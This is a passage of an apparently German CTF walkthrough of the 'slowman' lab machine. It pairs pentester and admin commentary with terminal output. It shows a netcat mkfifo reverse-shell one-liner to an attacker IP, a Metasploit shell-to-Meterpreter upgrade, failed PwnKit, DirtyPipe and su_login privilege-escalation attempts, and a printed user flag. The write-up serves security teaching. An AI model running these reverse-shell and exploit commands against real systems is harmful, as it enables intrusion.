+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of mar 05 dic 2023 15:07:24 UTC
+
+  System load:             0.05029296875
+  Usage of /:              67.3% of 9.75GB
+  Memory usage:            57%
+  Swap usage:              0%
+  Processes:               107
+  Users logged in:         0
+  IPv4 address for enp0s3: 192.168.2.113
+  IPv6 address for enp0s3: 2003:d4:c720:2381:a00:27ff:fe04:7dc6
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+El mantenimiento de seguridad expandido para Applications está desactivado.
+
+Se pueden aplicar 36 actualizaciones de forma inmediata.
+Para ver estas actualizaciones adicionales, ejecute: apt list --upgradable
+
+Active ESM Apps para recibir futuras actualizaciones de seguridad adicionales.
+Vea https://ubuntu.com/esm o ejecute sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Nov 24 19:53:52 2023 from 192.168.2.5
+                     </pre>
+                      <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command"></span></div>
+                  </div>
+              </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `trainerjean` wird `sudo -l` ausgeführt, um die sudo-Berechtigungen zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl erfordert das Passwort von `trainerjean`. Nach (vermutlich falscher) Eingabe wird gemeldet, dass `trainerjean` keine sudo-Rechte hat (`Sorry, user trainerjean may not run sudo on slowman.`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sudo ist kein direkter Weg zur Privilegieneskalation für diesen Benutzer. Suchen Sie nach anderen Vektoren wie SUID-Binaries, Capabilities, Cronjobs, Kernel-Exploits.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration, dass der Benutzer keine unnötigen sudo-Rechte hat.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">sudo -l</span></div>
+                       <pre>
+[sudo] password for trainerjean:
+Sorry, try again.
+[sudo] password for trainerjean:
+Sorry, user trainerjean may not run sudo on slowman.
+                       </pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -altpn` wird ausgeführt, um alle lauschenden TCP-Netzwerksockets (`-lt`), deren zugehörige Prozesse (`-p`) und numerische Adressen/Ports (`-n`) aufzulisten (`-a` zeigt alle Sockets).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt die bereits bekannten offenen Ports 21 (FTP), 22 (SSH), 80 (HTTP) und 3306 (MySQL). Zusätzlich lauscht MySQL auch auf Port 33060 auf dem Localhost (`127.0.0.1`). Port 53 (DNS) lauscht ebenfalls auf Localhost (`127.0.0.53`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der zusätzliche MySQL-Port 33060 auf Localhost könnte interessant sein, falls eine lokale Schwachstelle (z.B. in einer Webanwendung) ausgenutzt werden kann, um darauf zuzugreifen. Für den direkten externen Zugriff ist er nicht relevant.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Dienste nur auf den notwendigen Interfaces und Ports lauschen.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">ss -altpn</span></div>
+                       <pre>
+State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
+LISTEN    0         70                127.0.0.1:33060              0.0.0.0:*
+LISTEN    0         151                 0.0.0.0:3306               0.0.0.0:*
+LISTEN    0         4096          127.0.0.53%lo:53                 0.0.0.0:*
+LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*
+LISTEN    0         511                       *:80                       *:*
+LISTEN    0         32                        *:21                       *:*
+LISTEN    0         128                    [::]:22                    [::]:*
+                       </pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `find / -perm -4000 -ls 2>/dev/null` wird das gesamte Dateisystem nach Dateien mit gesetztem SUID-Bit durchsucht. Das SUID-Bit erlaubt das Ausführen einer Datei mit den Rechten des Dateieigentümers (oft `root`). Fehlermeldungen werden unterdrückt (`2>/dev/null`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird eine lange Liste von SUID-Binaries gefunden, viele davon Standard-Systemdateien (innerhalb von `/snap/...` oder `/usr/bin/` wie `passwd`, `su`, `sudo`, `mount`). Es gibt keine offensichtlich ungewöhnlichen oder benutzerdefinierten SUID-Dateien, die auf einen einfachen Exploit hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Versionen der gefundenen Standard-SUID-Binaries auf bekannte Schwachstellen (z.B. ältere Versionen von `sudo`). Obwohl keine ungewöhnlichen Dateien gefunden wurden, können Standard-Tools manchmal missbraucht werden (GTFOBins). Konzentrieren Sie sich auch auf andere PE-Vektoren wie Capabilities.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID-Binaries auf dem System. Entfernen Sie das SUID-Bit von Dateien, die es nicht benötigen. Halten Sie alle Systemkomponenten aktuell.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">find / -perm -4000 -ls 2>/dev/null</span></div>
+                       <pre>
+      843     84 -rwsr-xr-x   1 root     root        85064 nov 29  2022 /snap/core20/2015/usr/bin/chfn
+      849     52 -rwsr-xr-x   1 root     root        53040 nov 29  2022 /snap/core20/2015/usr/bin/chsh
+      918     87 -rwsr-xr-x   1 root     root        88464 nov 29  2022 /snap/core20/2015/usr/bin/gpasswd
+     1002     55 -rwsr-xr-x   1 root     root        55528 may 30  2023 /snap/core20/2015/usr/bin/mount
+     1011     44 -rwsr-xr-x   1 root     root        44784 nov 29  2022 /snap/core20/2015/usr/bin/newgrp
+     1026     67 -rwsr-xr-x   1 root     root        68208 nov 29  2022 /snap/core20/2015/usr/bin/passwd
+     1136     67 -rwsr-xr-x   1 root     root        67816 may 30  2023 /snap/core20/2015/usr/bin/su
+     1137    163 -rwsr-xr-x   1 root     root       166056 abr  4  2023 /snap/core20/2015/usr/bin/sudo
+     1195     39 -rwsr-xr-x   1 root     root        39144 may 30  2023 /snap/core20/2015/usr/bin/umount
+     1284     51 -rwsr-xr--   1 root     systemd-resolve    51344 oct 25  2022 /snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     1656    463 -rwsr-xr-x   1 root     root              473576 jul 19 19:56 /snap/core20/2015/usr/lib/openssh/ssh-keysign
+      847     84 -rwsr-xr-x   1 root     root               85064 nov 29  2022 /snap/core20/1974/usr/bin/chfn
+      853     52 -rwsr-xr-x   1 root     root               53040 nov 29  2022 /snap/core20/1974/usr/bin/chsh
+      922     87 -rwsr-xr-x   1 root     root               88464 nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
+     1006     55 -rwsr-xr-x   1 root     root               55528 may 30  2023 /snap/core20/1974/usr/bin/mount
+     1015     44 -rwsr-xr-x   1 root     root               44784 nov 29  2022 /snap/core20/1974/usr/bin/newgrp
+     1030     67 -rwsr-xr-x   1 root     root               68208 nov 29  2022 /snap/core20/1974/usr/bin/passwd
+     1140     67 -rwsr-xr-x   1 root     root               67816 may 30  2023 /snap/core20/1974/usr/bin/su
+     1141    163 -rwsr-xr-x   1 root     root              166056 abr  4  2023 /snap/core20/1974/usr/bin/sudo
+     1199     39 -rwsr-xr-x   1 root     root               39144 may 30  2023 /snap/core20/1974/usr/bin/umount
+     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     1660    463 -rwsr-xr-x   1 root     root              473576 abr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
+      297    129 -rwsr-xr-x   1 root     root              131832 may 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
+      297    129 -rwsr-xr-x   1 root     root              131832 sep 15 20:13 /snap/snapd/20290/usr/lib/snapd/snap-confine
+     1410     36 -rwsr-xr--   1 root     messagebus         35112 oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    38991    332 -rwsr-xr-x   1 root     root              338536 ago 24 13:40 /usr/lib/openssh/ssh-keysign
+    10243    136 -rwsr-xr-x   1 root     root              138408 may 29  2023 /usr/lib/snapd/snap-confine
+      829     48 -rwsr-xr-x   1 root     root               47480 feb 21  2022 /usr/bin/mount
+     1111     56 -rwsr-xr-x   1 root     root               55672 feb 21  2022 /usr/bin/su
+      680     36 -rwsr-xr-x   1 root     root               35200 mar 23  2022 /usr/bin/fusermount3
+     1112    228 -rwsr-xr-x   1 root     root              232416 abr  3  2023 /usr/bin/sudo
+      696     72 -rwsr-xr-x   1 root     root               72072 nov 24  2022 /usr/bin/gpasswd
+      875     60 -rwsr-xr-x   1 root     root               59976 nov 24  2022 /usr/bin/passwd
+      566     72 -rwsr-xr-x   1 root     root               72712 nov 24  2022 /usr/bin/chfn
+      572     44 -rwsr-xr-x   1 root     root               44808 nov 24  2022 /usr/bin/chsh
+      841     40 -rwsr-xr-x   1 root     root               40496 nov 24  2022 /usr/bin/newgrp
+     1187     36 -rwsr-xr-x   1 root     root               35192 feb 21  2022 /usr/bin/umount
+    13735     20 -rwsr-xr-x   1 root     root               18736 feb 26  2022 /usr/libexec/polkit-agent-helper-1
+                       </pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird Metasploit (`msfconsole -q`) gestartet. Es wird versucht, den `multi/handler` zu laden (mit Tippfehlern), was fehlschlägt. Nach Korrektur des Namens wird der Handler geladen, und ein Listener für eine Reverse-TCP-Shell (`generic/shell_reverse_tcp`) auf der lokalen Netzwerkschnittstelle `eth0` (IP 192.168.2.199) und Port 4444 konfiguriert und gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit, eine eingehende Verbindung vom Zielsystem entgegenzunehmen. Dies bereitet eine Reverse Shell vor, um eine interaktivere Sitzung als die SSH-Verbindung zu erhalten oder falls die SSH-Verbindung abbricht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie auf dem Zielsystem einen Befehl aus, der eine Verbindung zu `192.168.2.199:4444` herstellt (z.B. mit `nc`, `bash`, `python`, `perl`).<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen vom Zielsystem (Egress Filtering), um das Etablieren von Reverse Shells zu erkennen oder zu verhindern.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole -q</span></div>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use mutli/handler</span></div>
+                     <pre>
+[-] No results from search
+[-] Failed to load module: mutli/handler
+                     </pre>
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use mutli/handler</span></div>
+                      <pre>
+[-] No results from search
+[-] Failed to load module: mutli/handler
+                      </pre>
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                      <pre>[*] Using configured payload generic/shell_reverse_tcp</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                      <pre>lhost => 192.168.2.199</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                      <pre>lport => 4444</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                      <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4444
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem (in der SSH-Sitzung als `trainerjean`) wird ein Befehl ausgeführt, um eine Reverse Shell zum Metasploit-Listener aufzubauen. Es wird eine Named Pipe (`/tmp/f`) erstellt (`mkfifo`), der Inhalt dieser Pipe wird in eine Shell (`/bin/sh -i`) geleitet, deren Ein-/Ausgabe (`2>&1`) über Netcat (`nc`) an den Angreifer (`192.168.2.199:4444`) gesendet wird, und die Ausgabe von Netcat wird wiederum in die Pipe geschrieben (`>/tmp/f`), um die Shell am Leben zu erhalten. Der `rm`-Befehl schlägt fehl, da die Pipe noch nicht existiert, was aber harmlos ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich. Im Metasploit-Fenster wird angezeigt, dass eine Command Shell Session (`session 1`) geöffnet wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben nun eine alternative Shell-Sitzung über Metasploit. Diese kann für bestimmte Aufgaben (z.B. Upgrade zu Meterpreter) nützlicher sein als die reine SSH-Sitzung.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Erstellung von Named Pipes und die Ausführung von Netzwerk-Tools wie `nc`. Beschränken Sie ausgehende Verbindungen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4444 >/tmp/f</span></div>
+                       <pre>rm: cannot remove '/tmp/f': No such file or directory</pre>
+                       <!-- Keine weitere Ausgabe in dieser Shell, da die Verbindung zum Listener geht -->
+                    </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Ausgabe im Metasploit-Fenster -->
+                      <pre>
+[*] Command shell session 1 opened (192.168.2.199:4444 -> 192.168.2.113:57242) at 2023-12-05 16:10:29 +0100
+
+Shell Banner:
+$
+-----
+
+$
+
+$
+                      </pre>
+                   </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> In Metasploit wird das Post-Exploitation-Modul `multi/manage/shell_to_meterpreter` verwendet, um die bestehende Command Shell (`session 1`) in eine funktionsreichere Meterpreter-Sitzung zu upgraden. Ein neuer Listener-Port (`4443`) wird konfiguriert, und das Modul wird ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Upgrade ist erfolgreich. Eine neue Meterpreter-Sitzung (`session 2`) wird auf Port 4443 geöffnet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Vorteile der Meterpreter-Sitzung für weitere Enumeration, Datei-Up/Downloads, Pivoting oder die Ausführung anderer Meterpreter-spezifischer Module.<br><strong>Empfehlung (Admin):</strong> Erkennung von Payload-Staging (wie es hier passiert) durch Netzwerk- und Host-basierte Intrusion Detection Systeme (NIDS/HIDS). Prozessüberwachung auf dem Zielsystem.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use multi/manage/shell_to_meterpreter</span></div>
+                      <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                      <pre>session => 1</pre>
+                      <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4443</span></div>
+                      <pre>lport => 4443</pre>
+                      <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                      <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.199:4443
+[*] Sending stage (1017704 bytes) to 192.168.2.113
+[*] Meterpreter session 2 opened (192.168.2.199:4443 -> 192.168.2.113:48424) at 2023-12-05 16:11:52 +0100
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird in Metasploit nach Modulen gesucht, die `4034` im Namen enthalten, was auf die PwnKit-Schwachstelle (CVE-2021-4034) in `pkexec` abzielt. Das Modul `exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec` (Index 1) wird ausgewählt. Die Meterpreter-Sitzung (`session 2`) und ein neuer Listener-Port (`4445`) werden konfiguriert, und der Exploit wird gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der automatische Check (`AutoCheck`) des Moduls stellt fest, dass das Ziel nicht anfällig ist, da die `pkexec`-Binary nicht gefunden wird. Der Exploit wird abgebrochen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> PwnKit ist hier kein gangbarer Weg. Versuchen Sie andere vom `local_exploit_suggester` vorgeschlagene Module oder suchen Sie manuell nach anderen Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `pkexec` entweder nicht installiert ist oder auf eine gepatchte Version aktualisiert wurde.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">search 4034</span></div>
+                       <pre>
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  auxiliary/scanner/http/dolibarr_16_contact_dump      2023-03-14       normal     Yes    Dolibarr 16 pre-auth contact database dump
+   1  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  2022-01-25       excellent  Yes    Local Privilege Escalation in polkits pkexec
+   2  exploit/windows/local/ms18_8120_win32k_privesc       2018-05-09       good       No     Windows SetImeInfoEx Win32k NULL Pointer Dereference
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/local/ms18_8120_win32k_privesc
+                       </pre>
+                        <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use 1</span></div>
+                        <pre>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp</pre>
+                        <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set lport 4445</span></div>
+                        <pre>lport => 4445</pre>
+                        <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set session 2</span></div>
+                        <pre>session => 2</pre>
+                        <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">run</span></div>
+                        <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4445
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The pkexec binary was not found; try populating PkexecPath "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+                        </pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Metasploit-Modul `post/multi/recon/local_exploit_suggester` wird verwendet, um basierend auf der aktuellen Sitzung (`session 2`) nach potenziellen lokalen Privilegieneskalations-Exploits zu suchen. Nach anfänglichem Fehler (Session nicht gesetzt) wird die Sitzung konfiguriert und das Modul ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Suggester identifiziert drei potenziell relevante Exploits:
+                1.  `exploit/linux/local/cve_2022_0847_dirtypipe`: Scheint anfällig zu sein (Kernel 5.15.0).
+                2.  `exploit/linux/local/netfilter_priv_esc_ipv4`: Scheint anfällig zu sein.
+                3.  `exploit/linux/local/su_login`: Scheint anfällig zu sein.
+            Dies gibt konkrete nächste Schritte für die Privilegieneskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie die vorgeschlagenen Exploits systematisch, beginnend mit dem vielversprechendsten (oft Kernel-Exploits wie DirtyPipe, wenn die Version passt).<br><strong>Empfehlung (Admin):</strong> Halten Sie das System (Kernel, Pakete) aktuell, um bekannte Schwachstellen wie DirtyPipe zu patchen. Überprüfen Sie die Netfilter-Konfiguration und die `su`-Implementierung.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">search suggester</span></div>
+                      <pre>
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+                      </pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">use 0</span></div>
+                      <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                      <pre>[-] Post failed: Msf::OptionValidateError The following options failed to validate: SESSION.</pre>
+                      <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div>
+                      <pre>session => 2</pre>
+                      <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set lport 4445</span></div>
+                      <pre>lport => 4445</pre> <!-- LPORT ist hier eigentlich irrelevant, wird aber gesetzt -->
+                      <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                      <pre>
+[*] 192.168.2.113 - Collecting local exploits for x86/linux...
+[*] 192.168.2.113 - 188 exploit checks are being tried...
+[*] Running check method for exploit 13 / 58
+[+] 192.168.2.113 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.15.0
+[+] 192.168.2.113 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
+[+] 192.168.2.113 - exploit/linux/local/su_login: The target appears to be vulnerable.
+[*] Running check method for exploit 58 / 58
+[*] 192.168.2.113 - Valid modules for session 2:
+
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ 2   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+
+
+[*] Post module execution completed
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der DirtyPipe-Exploit (`exploit/linux/local/cve_2022_0847_dirtypipe`) wird ausgewählt und konfiguriert (Listener-Host/Port, Session 2). Der Exploit wird gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl der Check zuvor positiv war, meldet der Exploit bei der Ausführung `Exploit completed, but no session was created`. Er schlägt also fehl, eine Root-Shell zu liefern, obwohl er versucht, die SUID-Datei `/bin/passwd` zu überschreiben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> DirtyPipe funktioniert hier nicht wie erwartet. Versuchen Sie die anderen vom Suggester vorgeschlagenen Exploits (`netfilter_priv_esc_ipv4`, `su_login`) oder suchen Sie nach anderen Vektoren (Capabilities, Fehlkonfigurationen).<br><strong>Empfehlung (Admin):</strong> Auch wenn der Exploit hier fehlschlug, ist die Anfälligkeit laut Suggester vorhanden. Patchen Sie den Kernel, um CVE-2022-0847 zu beheben.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/linux/local/cve_2022_0847_dirtypipe</span></div>
+                      <pre>[*] Using configured payload linux/x64/meterpreter/reverse_tcp</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">options</span></div>
+                      <pre>
+Module options (exploit/linux/local/cve_2022_0847_dirtypipe):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   COMPILE           Auto             yes       Compile on target (Accepted: Auto, True, Fal
+                                                se)
+   SESSION                            yes       The session to run this module on
+   SUID_BINARY_PATH  /bin/passwd      no        The path to a suid binary
+   WRITABLE_DIR      /tmp             yes       A directory where we can write files
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+                      </pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lhost eth0</span></div>
+                      <pre>lhost => 192.168.2.199</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lport 4448</span></div>
+                      <pre>lport => 4448</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span></div>
+                      <pre>[-] Msf::OptionValidateError The following options failed to validate: SESSION</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set session 2</span></div>
+                      <pre>session => 2</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span></div>
+                      <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4448
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.15.0
+[*] Writing '/tmp/.vynenlonxzqd' (35592 bytes) ...
+[*] Executing exploit '/tmp/.vynenlonxzqd /bin/passwd'
+[*] Exploit completed, but no session was created.
+                      </pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command"></span></div>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Exploit `exploit/linux/local/su_login` wird ausgewählt und konfiguriert (Username `root`, Listener, Session 2). Dieser Exploit versucht, `su` zu verwenden, um eine Root-Shell zu bekommen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Auch dieser Exploit schlägt fehl (`Exploit completed, but no session was created`). Die Methode funktioniert auf diesem System nicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Metasploit-Kernel-Exploits scheinen nicht zu funktionieren. Konzentrieren Sie sich auf die Enumeration von Fehlkonfigurationen, Capabilities oder anderen Vektoren.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `su`-Konfiguration. Stellen Sie sicher, dass keine bekannten Schwachstellen in den verwendeten Login-Mechanismen vorhanden sind.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">use exploit/linux/local/su_login</span></div>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">set USERNAME root</span></div>
+                       <pre>USERNAME => root</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">run</span></div>
+                       <pre>[-] Msf::OptionValidateError The following options failed to validate: SESSION</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">set lhost eth0</span></div>
+                       <pre>lhost => 192.168.2.199</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">set lport 4448</span></div>
+                       <pre>lport => 4448</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">set session 2</span></div>
+                       <pre>session => 2</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(linux/local/su_login) > <span class="command">run</span></div>
+                       <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4448
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Uploading payload to target
+[*] Attempting to login with su
+[*] Exploit completed, but no session was created.
+                       </pre>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Zurück in der SSH-Shell als `trainerjean` wird der Inhalt des Home-Verzeichnisses aufgelistet. Die Datei `user.txt` wird gefunden und ihr Inhalt mit `cat` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">YU9et7HEpA$SwordofS10wMan!!</span>` wird erfolgreich ausgelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Fahren Sie mit der Suche nach dem Root-Zugriff fort.<br><strong>Empfehlung (Admin):</strong> Speichern Sie Flags oder sensible Daten nicht direkt im Home-Verzeichnis von Benutzern mit niedrigen Rechten. Sichern Sie sie mit entsprechenden Berechtigungen ab.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">ls -la</span></div>
+                       <pre>
+total 32
+drwxr-x--- 3 trainerjean trainerjean 4096 nov 23 21:44 .
+drwxr-xr-x 5 root        root        4096 nov 23 21:23 ..
+lrwxrwxrwx 1 root        root           9 nov 23 21:22 .bash_history -> /dev/null
+-rw-r--r-- 1 trainerjean trainerjean  220 nov 22 19:29 .bash_logout
+-rw-r--r-- 1 trainerjean trainerjean 3771 nov 22 19:29 .bashrc
+drwx------ 2 trainerjean trainerjean 4096 nov 22 19:30 .cache
+-rw-r--r-- 1 trainerjean trainerjean  807 nov 22 19:29 .profile
+-rw------- 1 trainerjean trainerjean   77 nov 23 21:44 .python_history
+-rw-r--r-- 1 root        root          29 nov 23 19:52 user.txt
+                       </pre>
